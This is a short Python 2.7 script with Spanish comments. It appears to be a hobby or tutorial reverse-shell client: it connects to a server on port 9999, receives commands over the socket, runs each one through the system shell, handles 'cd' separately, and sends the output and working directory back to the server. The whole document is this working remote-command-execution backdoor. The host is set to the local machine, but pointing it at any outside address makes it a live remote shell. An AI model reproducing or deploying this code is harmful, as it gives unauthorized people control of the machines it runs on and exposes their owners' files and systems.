'''
python 2.7.7 64 biuts y superiores
Creado por  "sammas" jeje.
Ultima actualizacion 4/11/2021

'''



import socket
import subprocess
import os

host = socket.gethostname()#tuIP. --> ipconfig en Windows o ifconfig en Linux' 
                            #socket.gethostname() obtiene la direccion Ip de quien ejecuta este programa 
port = 9999 #PUERTO TIENE QUE SER IGUAL AL QUE SE PUSO EN EL SERVIDOR

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((host,port))
print ("Conectado a traves del puerto: {}".format(port))
while True:# Espera a que el servidor mande instrucciones
    
    data = s.recv(1024) #Recibe el comando

    if data[:2].decode('utf-8') == 'cd':#Establece un caso especifico para cd.
        os.chdir(data[3:].decode('utf-8'))#Cambia directorio a los 3 caracteres despues de cd. !EJ cd carpeta. Se va a carpeta 
        
        
    if len(data)> 0:#Si el comando no es 0
        cmd = subprocess.Popen(data[:].decode('utf-8'),shell = True, stderr = subprocess.PIPE,
        stdout = subprocess.PIPE, stdin = subprocess.PIPE)# Llamada al sistema operativo
        bytes = cmd.stdout.read()+cmd.stderr.read() #Ejecuta el comando
        info_cliente = str(bytes)#Resultado del comando en lenguaje que podemos leer
        s.send(str.encode(info_cliente)+str.encode(os.getcwd() + '> '))# Envia los resultados al servidor
        #print (string_info)

s.close()
